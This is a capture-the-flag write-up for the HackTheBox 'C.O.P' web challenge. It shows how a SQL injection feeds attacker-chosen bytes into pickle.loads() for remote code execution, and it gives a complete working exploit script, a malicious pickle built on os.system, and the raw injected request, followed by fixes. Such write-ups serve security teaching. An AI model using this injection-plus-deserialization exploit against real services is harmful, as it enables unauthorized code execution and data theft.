## Overview

`C.O.P` (Cult of Pickles) is an Easy HackTheBox **Web** challenge — a Flask merch store that
serves each product by deserializing a `pickle` object out of the database. Two weaknesses chain
into unauthenticated RCE: a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) in the
`/view/<id>` route lets us choose exactly what the query returns, and the template feeds that value
straight into `pickle.loads()` — so we UNION-inject our own malicious pickle and run code on the
server.

## The technique

The store renders a product page like this (`item.html`):

```jinja
{% set item = product | pickle %}
```

That `pickle` filter (`app.py`) is the whole problem:

```python
@app.template_filter('pickle')
def pickle_loads(s):
    return pickle.loads(base64.b64decode(s))   # untrusted -> RCE
```

`pickle.loads()` reconstructs arbitrary Python objects, and an object's `__reduce__` method returns
a `(callable, args)` pair that runs **at load time** — so anyone who controls the bytes controls the
server ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)).

Who controls the bytes? The `product` value comes from `models.py`:

```python
return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
```

`product_id` is taken straight from the URL path `/view/<product_id>` and concatenated into the
query — a textbook [SQL injection](https://cwe.mitre.org/data/definitions/89.html). With `one=True`
the route returns the single first column of the first row, so a `UNION SELECT` lets us substitute
**our own** string for the `data` that gets unpickled.

## Solution

The page never reflects command output (`debug=False`), so the payload exfiltrates blind: it copies
the flag into Flask's static directory (`/app/application/static/`, served at `/static/`), then we
fetch it over HTTP.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, pickle, base64, os, urllib.parse, urllib.request

T = sys.argv[1] if len(sys.argv) > 1 else "TARGET:PORT"
BASE = f"http://{T}"
OUT = "pwn.txt"
CMD = f"cp /app/flag.txt /app/application/static/{OUT}"

class RCE:
    def __reduce__(self):
        return (os.system, (CMD,))

payload_b64 = base64.b64encode(pickle.dumps(RCE())).decode()
inj = f"0' UNION SELECT '{payload_b64}'-- -"
url = f"{BASE}/view/" + urllib.parse.quote(inj, safe="")
try:
    urllib.request.urlopen(url, timeout=10).read()
except Exception:
    pass
flag = urllib.request.urlopen(f"{BASE}/static/{OUT}", timeout=10).read().decode().strip()
print("[+] FLAG:", flag)
```

Run it against the instance:

```bash
python3 solve.py <target>:<port>
# [+] FLAG: HTB{...}
```

The injected request is just:

```
GET /view/0' UNION SELECT '<base64-pickle>'-- -
```

The query returns our pickle, the template unpickles it, `__reduce__` runs `os.system`, the flag
lands in `/static/pwn.txt`, and a second request reads it back.

## Why it worked

The developer treated the `data` column as trusted input to `pickle.loads()` — but the `id` that
selects *which* row's data to load was attacker-controlled and injectable. The SQL injection picks
the bytes; the insecure deserialization executes them. Either bug alone is serious; together they
are unauthenticated remote code execution.

## Fix / defense

- **Never `pickle.loads()` untrusted data** — use `json.loads()` with a strict schema. Pickle has
  no safe mode; it is designed to reconstruct arbitrary objects.
- **Parameterize the query** so the returned value can't be substituted:

```python
query_db("SELECT data FROM products WHERE id=?", (product_id,), one=True)
```

Both fixes are needed independently — parameterizing the query stops the attacker choosing the
bytes, and dropping pickle removes the code-execution sink entirely.
